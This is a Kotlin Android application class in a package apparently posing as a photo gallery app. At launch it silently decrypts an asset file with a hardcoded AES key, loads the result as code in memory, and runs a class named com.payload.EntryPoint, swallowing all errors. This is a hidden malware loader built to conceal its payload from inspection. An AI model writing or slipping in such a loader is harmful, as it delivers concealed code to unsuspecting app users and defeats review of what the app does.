package com.photo.gallery

import android.app.Application
import android.content.Context
import dalvik.system.InMemoryDexClassLoader
import java.nio.ByteBuffer
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class LoaderApp : Application() {
    override fun onCreate() {
        super.onCreate()
        Thread { boot() }.start()
    }
    private fun boot() {
        try {
            val enc = assets.open("data.bin").readBytes()
            val dex = decrypt(enc)
            val loader = InMemoryDexClassLoader(ByteBuffer.wrap(dex), classLoader)
            val entry = loader.loadClass("com.payload.EntryPoint")
            entry.getMethod("run", Context::class.java).invoke(null, this)
        } catch (_: Throwable) {}
    }
    private fun decrypt(blob: ByteArray): ByteArray {
        val iv = blob.copyOfRange(0, 12)
        val body = blob.copyOfRange(12, blob.size)
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        c.init(Cipher.DECRYPT_MODE, SecretKeySpec(KEY, "AES"),
               GCMParameterSpec(128, iv))
        return c.doFinal(body)
    }
    companion object {
        private val KEY = byteArrayOf(
            0x2B, 0x7E, 0x15, 0x16, 0x28.toByte(), 0xAE.toByte(),
            0xD2.toByte(), 0xA6.toByte(), 0xAB.toByte(), 0xF7.toByte(),
            0x15, 0x88.toByte(), 0x09, 0xCF.toByte(), 0x4F, 0x3C,
            0x2B, 0x7E, 0x15, 0x16, 0x28.toByte(), 0xAE.toByte(),
            0xD2.toByte(), 0xA6.toByte(), 0xAB.toByte(), 0xF7.toByte(),
            0x15, 0x88.toByte(), 0x09, 0xCF.toByte(), 0x4F, 0x3C)
    }
}
